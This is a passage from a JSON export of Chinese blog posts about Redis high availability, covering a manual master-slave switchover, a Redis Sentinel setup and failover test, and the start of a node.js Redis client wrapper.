\u4ece <code>Master<\/code> \u91cd\u65b0\u8fdb\u884c\u4e86\u6570\u636e\u540c\u6b65\u3002\n<\/p>\n<\/li>\n\n<li>\u5728 <code>Slave<\/code> \u4e0a\u8bfb\u53d6\n\n<pre class=\"example\">\nnot connected&gt; get hello\n\"redis\"\n127.0.0.1:6380&gt;\n<\/pre>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2-5\" class=\"outline-3\">\n<h3 id=\"sec-2-5\">\u6f14\u793aMaster\u6302\u6389\u7684\u573a\u666f<\/h3>\n<div class=\"outline-text-3\" id=\"text-2-5\">\n<ul class=\"org-ul\">\n<li>\u5173\u95ed <code>Master<\/code>\n\n<pre class=\"example\">\n127.0.0.1:6379&gt; shutdown\nnot connected&gt;\n<\/pre>\n\n<p>\n\u7ec8\u7aef <code>1<\/code> \u4e0a\u7684 <code>redis-server<\/code> \u4f1a\u81ea\u52a8\u9000\u51fa\uff0c\u6ce8\u610f\u5230\u5b83\u9000\u51fa\u524d\u8fdb\u884c\u4e86\u5b58\u76d8\uff0c \u7ec8\u7aef <code>2<\/code> \u4e0a\u7684 <code>Slave<\/code> \u5728\u4e0d\u65ad\u5c1d\u8bd5\u91cd\u8fde <code>Master<\/code> \u3002\n<\/p>\n<\/li>\n\n<li>Master-Slave\u89d2\u8272\u5207\u6362\n\n<p>\n\u5c06\u8fd0\u884c\u4e2d\u7684\u539f <code>Slave<\/code> \u63d0\u5347\u4e3a\u65b0 <code>Master<\/code>\n<\/p>\n\n<pre class=\"example\">\n127.0.0.1:6380&gt; slaveof no one\nOK\n<\/pre>\n\n<p>\n\u4fee\u6539\u539f <code>Slave<\/code> \u7684\u914d\u7f6e\u6587\u4ef6 <code>redis-slave.conf<\/code> \u5220\u9664\u914d\u7f6e <code>#slaveof 127.0.0.1 6379<\/code>\n<\/p>\n\n<p>\n\u4fee\u6539\u539f <code>Master<\/code> \u7684\u914d\u7f6e\u6587\u4ef6 <code>redis-master.conf<\/code> \u6dfb\u52a0\u914d\u7f6e <code>slaveof 127.0.0.1 6380<\/code>\n<\/p>\n<\/li>\n\n<li>\u5728\u65b0 <code>Master<\/code> \u5199\u5165\n\n<pre class=\"example\">\n127.0.0.1:6380&gt; set hello master-slave\nOK\n<\/pre>\n<\/li>\n\n<li>\u5728\u7ec8\u7aef <code>1<\/code> \u4e0a\u518d\u6b21\u542f\u52a8\u539f <code>Master<\/code> \n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">redis-server .\/redis-master.conf\n<\/pre>\n<\/div>\n\n<p>\n\u4ece\u65e5\u5fd7\u4e0a\u53ef\u4ee5\u770b\u5230\u5b83\u73b0\u5728\u662f <code>Slave<\/code> \u89d2\u8272\u4e86\uff0c\u53cd\u800c\u4ece\u539f <code>Slave<\/code> \u540c\u6b65\u6570\u636e\u3002\n<\/p>\n<\/li>\n\n<li>\u5728\u539f <code>Master<\/code> \u4e0a\u8bfb\u53d6\n\n<pre class=\"example\">\nnot connected&gt; get hello\n\"master-slave\"\n127.0.0.1:6379&gt;\n<\/pre>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2-6\" class=\"outline-3\">\n<h3 id=\"sec-2-6\">\u603b\u7ed3<\/h3>\n<div class=\"outline-text-3\" id=\"text-2-6\">\n<p>\n<code>Redis<\/code> \u7684 <code>Master-Slave<\/code> \u662f\u4e00\u79cd\u52a8\u6001\u5173\u7cfb\uff0c\u89d2\u8272\uff08 <code>Master<\/code> \u3001 <code>Slave<\/code> \uff09\u4f1a\u4e92\u76f8\u8f6c\u6362\uff0c\u89d2\u8272\u8f6c\u6362\u8fc7\u7a0b\u4e2d\u5fc5\u987b\u4e25\u683c\u6309\u7167\u6b65\u9aa4\u6765\uff0c\u64cd\u4f5c\u4e0d\u5f53\u53ef\u80fd\u5bfc\u81f4\u6570\u636e\u4e22\u5931\u3002\n<\/p>\n\n<p>\n\u540e\u9762\u4f1a\u53d1\u6587\u4ecb\u7ecd\u81ea\u52a8\u8fdb\u884c\u8fd9\u79cd\u5207\u6362\u7684\u5de5\u5177 <code>Redis Sentinel<\/code> \uff0c\u4ee5\u53ca\u5f53 <code>Master-Slave<\/code> \u53d1\u751f\u5207\u6362\u540e\uff0c\u5e94\u7528\u7a0b\u5e8f\u8be5\u5982\u4f55\u91cd\u8fde\u5230\u65b0\u7684 <code>Master<\/code> \u3002\n<\/p>\n<\/div>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">\u53c2\u8003<\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n<a href=\"https:\/\/en.wikipedia.org\/wiki\/Master\/slave_(technology)\">Master\/slave (technology) - Wikipedia, the free encyclopedia<\/a>\n<\/p>\n\n<p>\n<a href=\"http:\/\/redis.io\/topics\/replication\">Replication \u2013 Redis<\/a>\n<\/p>\n\n<p>\n<a href=\"http:\/\/www.tuicool.com\/articles\/2QbABj\">Redis slave\u5207\u6362\u4e3amaster\u64cd\u4f5c\uff08\u4e0d\u505c\u673a\uff09 - \u63a8\u9177<\/a><\/p>\n<\/div>\n<\/div>\n"
},
{
  "title": "redis\u9ad8\u53ef\u7528\u6027\u65b9\u6848\uff1aSentinel",
  "timestamp": "2015-12-26 22:54:00",
  "tags": [
    "redis"
  ],
  "body": "<p>\n\u5728\u524d\u9762\u4e00\u7bc7\u6587\u7ae0\u300a <a href=\"http:\/\/blog.kankanan.com\/article\/redis-9ad853ef7528602757fa7840ff1a-master-slave.html\">redis\u9ad8\u53ef\u7528\u6027\u57fa\u7840\uff1aMaster-Slave<\/a> \u300b\u4e2d\uff0c\u4e3b\u5907\u5207\u6362\u8fc7\u7a0b\u65f6\u6709\u597d\u51e0\u4e2a\u6b65\u9aa4\uff0c\u9700\u8981\u4eba\u5de5\u4ecb\u5165\uff0c\u8fd9\u52bf\u5fc5\u589e\u52a0\u670d\u52a1\u7684\u6545\u969c\u65f6\u95f4\uff08Down Time\uff09\u3002\n<\/p>\n\n<p>\n\u800c <code>Sentinel<\/code> \u6b63\u662f\u81ea\u52a8\u5316\u8fd9\u4e00\u8fc7\u7a0b\u7684\u5b98\u65b9\u5de5\u5177\uff0c\u8be6\u7ec6\u6587\u6863\u8bf7\u53c2\u8003\u300a<a href=\"http:\/\/redis.io\/topics\/sentinel\">Redis Sentinel Documentation \u2013 Redis<\/a>\u300b\u3002\n<\/p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\"><code>Sentinel<\/code> \u7684\u529f\u80fd<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<ul class=\"org-ul\">\n<li>\u76d1\u63a7\n\n<p>\n<code>Sentinel<\/code> \u4e0d\u65ad\u5730\u68c0\u6d4b <code>Master<\/code> \u548c <code>Slave<\/code> \u5b9e\u4f8b\u7684\u8fd0\u884c\u72b6\u6001\u3002\n<\/p>\n<\/li>\n\n<li>\u901a\u77e5\n\n<p>\n<code>Sentinel<\/code> \u901a\u8fc7API\uff0c\u80fd\u591f\u901a\u77e5\u7cfb\u7edf\u7ba1\u7406\u5458\u3001\u5176\u5b83\u7a0b\u5e8f\uff1a\u76d1\u63a7\u7684Redis\u5b9e\u4f8b\u51fa\u95ee\u9898\u4e86\u3002\n<\/p>\n<\/li>\n\n<li>\u81ea\u52a8\u6545\u969c\u5207\u6362\n\n<p>\n\u5982\u679c <code>Master<\/code> \u5b9e\u4f8b\u51fa\u95ee\u9898\u4e86\uff0c <code>Sentinel<\/code> \u901a\u8fc7\u5c06\u4e00\u4e2a <code>Slave<\/code> \u5b9e\u4f8b\u63d0\u5347\u4e3a <code>Master<\/code> \u4fee\u590d\u6545\u969c\uff0c\u5176\u5b83 <code>Slave<\/code> \u5b9e\u4f8b\u4f7f\u7528\u65b0\u7684 <code>Master<\/code> \u5b9e\u4f8b\uff0c\u540c\u65f6\u901a\u77e5\u7ed9\u4f7f\u7528Redis\u670d\u52a1\u7684\u5e94\u7528\u7a0b\u5e8f\u4ee5\u4fbf\u91cd\u65b0\u5efa\u7acb\u8fde\u63a5\u3002\n<\/p>\n<\/li>\n\n<li>\u914d\u7f6e\u63d0\u4f9b\u8005\n\n<p>\n<code>Sentinel<\/code> \u505a\u4e3a\u5ba2\u6237\u7aef\u670d\u52a1\u53d1\u73b0\u7684\u6743\u5a01\u6765\u6e90\uff1a\u5ba2\u6237\u7aef\u8fde\u63a5\u5230 <code>Sentinel<\/code> \u4ee5\u83b7\u53d6\u5f53\u524d <code>Master<\/code> \u7684\u5730\u5740\uff0c\u6545\u969c\u5207\u6362\u540e\u62a5\u544a\u65b0\u7684\u5730\u5740\u3002\n<\/p>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\"><code>Sentinel<\/code> \u6f14\u793a<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n<code>Redis Sentinel<\/code> \u63a8\u8350\u7684\u914d\u7f6e\u4e3a\u81f3\u5c11\u4e09\u4e2aSentinel\u90e8\u7f72\u5728\u4e09\u53f0\u4e0d\u540c\u7684\u673a\u5668\u4e0a\uff0c\u53ea\u914d\u4e00\u53f0\u81ea\u5df2\u672c\u8eab\u5c31\u662f\u5355\u70b9\u6ca1\u6709\u610f\u4e49\uff0c\u4e8c\u53f0\u65f6\u53ef\u80fd\u51fa\u73b0\u201c\u8111\u88c2\u201d\u3002\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u542f\u52a8\u4e0a\u4e00\u7bc7\u6587\u7ae0\u300a <a href=\"http:\/\/blog.kankanan.com\/article\/redis-9ad853ef7528602757fa7840ff1a-master-slave.html\">redis\u9ad8\u53ef\u7528\u6027\u57fa\u7840\uff1aMaster-Slave<\/a> \u300b\u914d\u7f6e\u597d\u7684 <code>Master<\/code> \u53ca <code>Slave<\/code> Redis\u5b9e\u4f8b\n\n<p>\n<code>Master<\/code> \u76d1\u542c\u5728 <code>6379<\/code> \u7aef\u53e3\uff0c <code>Slave<\/code> \u76d1\u542c\u5728 <code>6380<\/code> \u7aef\u53e3\u3002\n<\/p>\n<\/li>\n\n<li>\u4f7f\u7528\u7aef\u53e3\u53f7 <code>5000<\/code> <code>5001<\/code> <code>5002<\/code> \u521b\u5efa\u4e09\u4e2a <code>Sentinel<\/code> \u5b9e\u4f8b\n\n<p>\n<code>Sentinel<\/code> \u5b9e\u4f8b <code>a<\/code> \u7684\u914d\u7f6e\u6587\u4ef6 <code>redis-sentinel-a.conf<\/code>\n<\/p>\n\n<pre class=\"example\">\nport 5000\nsentinel monitor mymaster 127.0.0.1 6379 2\nsentinel down-after-milliseconds mymaster 5000\nsentinel failover-timeout mymaster 60000\nsentinel parallel-syncs mymaster 1\n<\/pre>\n\n<p>\n\u5176\u5b83\u4e24\u4e2a <code>Sentinel<\/code> \u5b9e\u4f8b <code>b<\/code> <code>c<\/code> \u914d\u7f6e\u548c <code>a<\/code> \u57fa\u672c\u4e00\u6837\uff0c\u53ea\u662f\u7aef\u53e3\u53f7\u5206\u522b\u4e3a <code>5001<\/code> \u548c <code>5002<\/code> \uff1a\n<\/p>\n\n<p>\n<a href=\"..\/static\/redis-sentinel-a.conf\">redis-sentinel-a.conf<\/a>\n<\/p>\n\n<p>\n<a href=\"..\/static\/redis-sentinel-b.conf\">redis-sentinel-b.conf<\/a>\n<\/p>\n\n<p>\n<a href=\"..\/static\/redis-sentinel-c.conf\">redis-sentinel-c.conf<\/a>\n<\/p>\n\n<p>\n\u7ec8\u7aef <code>3<\/code> \u542f\u52a8 <code>Sentinel a<\/code> <code>redis-sentinel .\/redis-sentinel-a.conf<\/code>\n<\/p>\n\n<p>\n\u7ec8\u7aef <code>4<\/code> \u542f\u52a8 <code>Sentinel b<\/code> <code>redis-sentinel .\/redis-sentinel-b.conf<\/code>\n<\/p>\n\n<p>\n\u7ec8\u7aef <code>5<\/code> \u542f\u52a8 <code>Sentinel c<\/code> <code>redis-sentinel .\/redis-sentinel-c.conf<\/code>\n<\/p>\n\n<p>\n\u53ef\u4ee5\u53d1\u73b0\u5f53 <code>Sentinel<\/code> \u5b9e\u4f8b\u542f\u52a8\u65f6 <code>Sentinel<\/code> \u7684\u914d\u7f6e\u6587\u4ef6\u4f1a\u81ea\u52a8\u8fdb\u884c\u66f4\u65b0\uff0c\u8bb0\u5f55 <code>Slave<\/code> \u53ca\u5176\u5b83 <code>Sentinel<\/code> \u7684\u4fe1\u606f\u3002\n<\/p>\n<\/li>\n\n<li>\u4ece <code>Sentinel<\/code> \u83b7\u53d6\u5f53\u524d <code>Master<\/code> \u7684\u5730\u5740\n\n<p>\n\u901a\u8fc7 <code>redis-cli<\/code> \u8fde\u4e0a\u4efb\u4e00 <code>Sentinel<\/code> <code>redis-cli -p 5000<\/code>\n<\/p>\n\n<pre class=\"example\">\n127.0.0.1:5000&gt; sentinel get-master-addr-by-name mymaster\n1) \"127.0.0.1\"\n2) \"6379\"\n<\/pre>\n<\/li>\n\n<li>\u6545\u969c\u5207\u6362\u6d4b\u8bd5\n\n<p>\n\u8ba9 <code>Master<\/code> \u505c\u6b62\u54cd\u5e94 <code>30<\/code> \u79d2 <code>redis-cli -p 6379 debug sleep 30<\/code>\n<\/p>\n\n<p>\n\u7ea6 <code>10<\/code> \u79d2\u949f\u540e\uff0c\u901a\u8fc7 <code>Sentinel<\/code> \u7684\u65e5\u5fd7\u8f93\u51fa\u770b\u5230\u53d1\u751f\u4e86\u4e3b\u4ece\u5207\u6362\u3002\n<\/p>\n\n<p>\n\u91cd\u65b0\u83b7\u53d6\u5f53\u524d\u7684 <code>Master<\/code>\n<\/p>\n\n<pre class=\"example\">\n127.0.0.1:5000&gt; sentinel get-master-addr-by-name mymaster\n1) \"127.0.0.1\"\n2) \"6380\"\n<\/pre>\n\n<p>\n<code>Redis<\/code> \u5b9e\u4f8b\u7684\u914d\u7f6e\u6587\u4ef6\u88ab\u81ea\u52a8\u4fee\u6b63\uff0c\u4ee5\u53cd\u6620\u65b0\u7684 <code>Master-Slave<\/code> \u72b6\u6001\uff1a\n<\/p>\n\n<p>\n<code>redis-master.conf<\/code> \u6dfb\u52a0\u4e86\u914d\u7f6e\u884c <code>slaveof 127.0.0.1 6380<\/code>\n<\/p>\n\n<p>\n<code>redis-slave.conf<\/code> \u5220\u9664\u4e86\u914d\u7f6e\u884c <code>slaveof 127.0.0.1 6379<\/code>\n<\/p>\n\n<p>\n\u548c\u6211\u4eec\u5728\u4e0a\u4e00\u7bc7\u6587\u7ae0\u300a <a href=\"http:\/\/blog.kankanan.com\/article\/redis-9ad853ef7528602757fa7840ff1a-master-slave.html\">redis\u9ad8\u53ef\u7528\u6027\u57fa\u7840\uff1aMaster-Slave<\/a> \u300b\u624b\u5de5\u505a\u7684\u4e3b\u5907\u5207\u6362\u5982\u51fa\u4e00\u8f99\u3002\n<\/p>\n\n<p>\n\u4e09\u4e2a <code>Sentinel<\/code> \u914d\u7f6e\u6587\u4ef6\u4e2d\u7684 <code>Master-Slave<\/code> \u914d\u7f6e\u4e5f\u88ab\u81ea\u52a8\u4fee\u6b63\u3002\n<\/p>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">\u7591\u95ee<\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<ul class=\"org-ul\">\n<li><code>Redis<\/code> \u5b9e\u4f8b\u7684\u914d\u7f6e\u6587\u4ef6\u662f\u88ab\u8c01\u4fee\u6539\u7684\uff1f\n\n<p>\n\u5982\u679c\u662f <code>Sentinel<\/code> \u90a3\u4e48\u5c31\u610f\u5473\u7740\u6240\u6709 <code>Redis<\/code> \u5b9e\u4f8b\u7684\u540c\u4e00\u673a\u5668\u4e0a\u5fc5\u987b\u914d\u7f6e\u6709 <code>Sentinel<\/code> \uff08\u300a<a href=\"http:\/\/redis.io\/topics\/sentinel\">Redis Sentinel Documentation \u2013 Redis<\/a>\u300b\u672a\u63d0\u53ca\uff09\u3002\n<\/p>\n<\/li>\n\n<li>\u4e07\u4e00\u56e0\u4e3a\u67d0\u79cd\u539f\u56e0\uff0c\u539f <code>Master<\/code> \u914d\u7f6e\u6587\u4ef6\u672a\u6539\u4e3a <code>Slave<\/code> \uff0c\u4f1a\u4e0d\u4f1a\u51fa\u73b0\u8111\u88c2\uff1f\n\n<p>\n\u611f\u89c9\u5e94\u8be5\u662f\u4f1a\u51fa\u73b0\u8111\u88c2\u7684\uff0c\u4f46\u662f\u53ea\u8981\u5ba2\u6237\u7aef\u5e94\u7528\u603b\u662f\u4f7f\u7528 <code>Sentinel<\/code> \u63d0\u4f9b\u7684 <code>Master<\/code> \u5730\u5740\uff0c\u5c31\u4e0d\u4f1a\u6709\u95ee\u9898\u3002\n<\/p>\n\n<p>\n<code>node.js<\/code> \u8bbf\u95ee\u5355\u4e2a <code>redis<\/code> \u5b9e\u4f8b\u5df2\u7ecf\u7528\u5f97\u5f88\u6e9c\u4e86\uff0c\u4e0b\u4e00\u7bc7\u6587\u7ae0\u4f1a\u7814\u7a76 <code>node.js<\/code> \u8bbf\u95ee <code>redis sentinel<\/code> \uff0c\u76f8\u4fe1\u7b54\u6848\u5c31\u4f1a\u6c34\u843d\u77f3\u51fa\u4e86\u3002\n<\/p>\n<\/li>\n\n<li><code>Redis Sentinel<\/code> \u80fd\u4fdd\u8bc1\u4e0d\u4e22\u6570\u636e\u5417\uff1f\n\n<p>\n\u4e0d\u80fd\u3002\u7531\u4e8e <code>Redis<\/code> \u662f\u5f02\u6b65\u590d\u5236\uff0c\u6ca1\u6709\u529e\u6cd5\u9632\u6b62\u6570\u636e\u4e22\u5931\uff0c\u5047\u8bbe\u914d\u7f6e\u5982\u4e0b\uff1a\n<\/p>\n\n<pre class=\"example\">\nmin-slaves-to-write 1\nmin-slaves-max-lag 10\n<\/pre>\n\n<p>\n\u5047\u8bbe\u51fa\u73b0\u4e86\u5206\u88c2\uff08partition\uff09\uff0c <code>Master<\/code> \u8981 <code>10<\/code> \u79d2\u949f\u540e\u624d\u53d1\u73b0 <code>Slave<\/code> \u5931\u8054\u518d\u7981\u6b62\u5199\u5165\uff0c\u5f53\u5206\u88c2\u6d88\u9664\uff08partition heals\uff09\uff0c \u65e7 <code>Master<\/code> \u505a\u4e3a <code>Slave<\/code> \u8fde\u4e0a\u65b0\u7684 <code>Master<\/code> \uff0c\u8fd9 <code>10<\/code> \u79d2\u949f\u5185\u5199\u5165\u7684\u6570\u636e\u4e0d\u4f1a\u5408\u5165\uff08merge\uff09\u65b0\u7684 <code>Master<\/code> \uff0c\u6570\u636e\u4e22\u5931\u4e86\u3002\n<\/p>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">\u53c2\u8003<\/h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<p>\n<a href=\"http:\/\/redis.io\/topics\/sentinel\">Redis Sentinel Documentation \u2013 Redis<\/a><\/p>\n<\/div>\n<\/div>\n"
},
{
  "title": "node.js\u8fde\u63a5redis\u9ad8\u53ef\u7528\u6027\u65b9\u6848\uff1aSentinel",
  "timestamp": "2015-12-27 14:27:00",
  "tags": [
    "redis",
    "node"
  ],
  "body": "<p>\nnode.js\u540e\u53f0\u5e94\u7528\u5728\u5f00\u59cb\u65f6\u5f80\u5f80\u4e0d\u4f1a\u641e\u5f97\u592a\u590d\u6742\uff0c\u4f7f\u7528\u5355\u5b9e\u4f8b\u7684redis\uff0c\u4e00\u822c\u90fd\u4f1a\u4f7f\u7528\u5b98\u65b9\u63a8\u8350\u7684\u6a21\u5757 <a href=\"https:\/\/github.com\/NodeRedis\/node_redis\">node_redis<\/a> \u3002\n<\/p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u8bbf\u95ee\u5355\u5b9e\u4f8bnode.js<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n\u5728 <a href=\"https:\/\/github.com\/NodeRedis\/node_redis\">node_redis<\/a> \u7684\u57fa\u7840\u4e0a\u7a0d\u4f5c\u5c01\u88c5\uff0c\u4e3b\u8981\u662f\u907f\u514d\u5e76\u884c\u8bbf\u95ee\u65f6\u610f\u5916\u521b\u5efa\u591a\u4e2aredis\u8fde\u63a5\u3002\n<\/p>\n<\/div>\n\n<div id=\"outline-container-sec-1-1\" class=\"outline-3\">\n<h3 id=\"sec-1-1\">database.js<\/h3>\n<div class=\"outline-text-3\" id=\"text-1-1\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">redis<\/span> = require(<span style=\"color: #66cccc;\">'redis'<\/span>);\n\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">Database<\/span>() {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">self<\/span> = <span style=\"color: #6699cc;\">this<\/span>;\n\n<span style=\"background-color: #515151;\"> <\/span>   self._redis_host = <span style=\"color: #66cccc;\">'127.0.0.1'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   self._redis_port = 6379;\n<span style=\"background-color: #515151;\"> <\/span>   self._redis_db = 2;\n\n<span style=\"background-color: #515151;\"> <\/span>   self._redis = <span style=\"color: #6699cc;\">null<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   self._redis_selected = <span style=\"color: #6699cc;\">false<\/span>;\n}\n\nDatabase.<span style=\"color: #6699cc;\">prototype<\/span>.redis = <span style=\"color: #99cc99;\">function<\/span>(<span style=\"color: #ffcc66;\">callback<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">self<\/span> = <span style=\"color: #6699cc;\">this<\/span>;\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (self._redis &amp;&amp; self._redis_selected) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> callback(<span style=\"color: #6699cc;\">null<\/span>, self._redis);\n<span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (! self._redis) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   self._redis = redis.createClient(self._redis_port, self._redis_host);\n<span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   self._redis.select(self._redis_db, <span style=\"color: #99cc99;\">function<\/span> (<span style=\"color: #ffcc66;\">err<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (err) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> callback(err);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   self._redis_selected = <span style=\"color: #6699cc;\">true<\/span>;\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> callback(<span style=\"color: #6699cc;\">null<\/span>, self._redis);\n<span style=\"background-color: #515151;\"> <\/span>   });\n};\n\n\nmodule.exports = <span style=\"color: #99cc99;\">new<\/span> <span style=\"color: #6699cc;\">Database<\/span>();\n<\/pre>\n<\/div>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-1-2\" class=\"outline-3\">\n<h3 id=\"sec-1-2\">client.js<\/h3>\n<div class=\"outline-text-3\" id=\"text-1-2\">\n<p>\n\u4f7f\u7528 <code>database.js<\/code>\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">db<\/span> = require(<span style=\"color: #66cccc;\">'.\/database'<\/span>);\n\ndb.redis(<span style=\"color: #99cc99;\">function<\/span> (<span style=\"color: #ffcc66;\">err<\/span>, <span style=\"color: #ffcc66;\">client<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(err) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   console.error(err.toString());\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> process.exit(1);\n<span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   client.set(<span style=\"color: #66cccc;\">'hello'<\/span>, <span style=\"color: #66cccc;\">'world'<\/span>, <span style=\"color: #99cc99;\">function<\/span> (<span style=\"color: #ffcc66;\">err<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(err) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   console.error(err.toString());\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> process.exit(1);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   setTimeout(<span style=\"color: #99cc99;\">function<\/span> () {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   client.get(<span style=\"color: #66cccc;\">'hello'<\/span>, <span style=\"color: #99cc99;\">function<\/span> (<span style=\"color: #ffcc66;\">err<\/span>, <span style=\"color: #ffcc66;\">value<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(err) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   console.error(err.toString());\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> process.exit(1);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   console.log(<span style=\"color: #66cccc;\">'hello: '<\/span> + value);\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   process.exit(0);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   });\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }, 20*1000);\n<span style=\"background-color: #515151;\"> <\/span>   });\n});\n<\/pre>\n<\/div>\n<\/div>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">\u8bbf\u95ee\u4e3b\u5907Redis<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n\u4f46\u662f\u968f\u7740\u670d\u52a1\u7684\u6210\u529f\uff0c\u7528\u6237\u91cf\u5f00\u59cb\u589e\u52a0\uff0c\u53e6\u5916\u5bf9\u7a33\u5b9a\u6027\u3001\u53ef\u9760\u6027\u6709\u4e86\u4e00\u5b9a\u8981\u6c42\uff0c\u786e\u4fdd\u6570\u636e\u7684\u5b89\u5168\u6027\u6210\u4e86\u91cd\u4e2d\u4e4b\u91cd\uff0credis\u7531\u5355\u673a\u8f6c\u5411\u4e3b\/\u5907\uff08Replication\uff09\u751a\u81f3\u96c6\u7fa4\uff08Cluster\uff09\uff0c\n\u672c\u6587\u53ea\u5173\u6ce8\u4f7f\u7528 <code>Sentinel<\/code> \u7ba1\u7406\u7684\u4e3b\/\u5907\uff08Replication\uff09Redis\u3002\n<\/p>\n\n<p>\n\u8fd9\u5c31\u610f\u5473\u7740Redis\u5ba2\u6237\u7aef\u5e94\u7528\u4e0d\u80fd\u76f4\u63a5\u8fde\u63a5Redis\u5b9e\u4f8b\uff0c\u800c\u662f\u9700\u8981\u5148\u8fde\u63a5 <code>Sentinel<\/code> \uff0c\u6839\u636e <code>Sentinel<\/code> \u63d0\u4f9b\u7684 <code>Master<\/code> \u6216 <code>Slave<\/code> 